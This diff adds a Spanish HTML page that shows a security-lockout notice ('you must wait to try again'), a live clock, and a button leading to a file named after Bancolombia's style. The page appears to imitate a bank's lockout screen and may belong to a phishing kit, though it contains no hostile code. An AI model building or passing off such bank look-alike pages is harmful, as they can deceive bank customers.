@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Título de tu página</title>
+  <style>
+    /* Estilos generales */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 100%;
+      padding: 20px;
+    }
+    /* Estilos para el logo */
+    .imgLogoItem {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto 20px;
+    }
+    /* Estilos para la imagen de error */
+    .imgError {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 20px auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="header">
+      <!-- Aquí puedes añadir tu imagen -->
+      <img class="imgLogoItem" src="C:\Users\Lopez\Documents\.HMTL\bkm1.jpg" alt="Tu logo">
+      <!-- Aquí se mostrará la hora actual -->
+      <div>Fecha y hora actual: <span id="clock"></span></div>
+    </div>
+    <div>
+      <div>
+        <!-- Aquí puedes añadir tu imagen de error -->
+        <img class="imgError" src="C:\Users\Lopez\Documents\.HMTL\padlock.jpg" alt="Error">
+      </div>
+      <div>
+        <p>Debes esperar para volver a intentarlo</p>
+        <p>Por seguridad, en este momento no puedes continuar con el proceso. Inténtalo más tarde.</p>
+      </div>
+    </div>
+    <div>
+      <button style="display: block; margin: 20px auto; padding: 10px 20px; font-weight: 600; font-size: 16px;" onclick="location.href='bancolombiaestilo.html';">Entendido</button>
+    </div>
+  </div>
+  <script>
+    // Función para actualizar la hora cada segundo
+    function updateClock() {
+      var now = new Date();
+      var hours = now.getHours();
+      var minutes = now.getMinutes();
+      var seconds = now.getSeconds();
+      // Formato de hora de 12 horas y agregar ceros iniciales si es necesario
+      var meridiem = hours >= 12 ? 'PM' : 'AM';
+      hours = hours % 12;
+      hours = hours ? hours : 12;
+      minutes = minutes < 10 ? '0' + minutes : minutes;
+      seconds = seconds < 10 ? '0' + seconds : seconds;
+      // Mostrar la hora en el formato deseado
+      var timeString = hours + ':' + minutes + ':' + seconds + ' ' + meridiem;
+      document.getElementById('clock').textContent = timeString;
+      // Llamar a la función cada segundo
+      setTimeout(updateClock, 1000);
+    }
+    // Llamar a la función para iniciarla
+    updateClock();
+  </script>
+</body>
+</html>
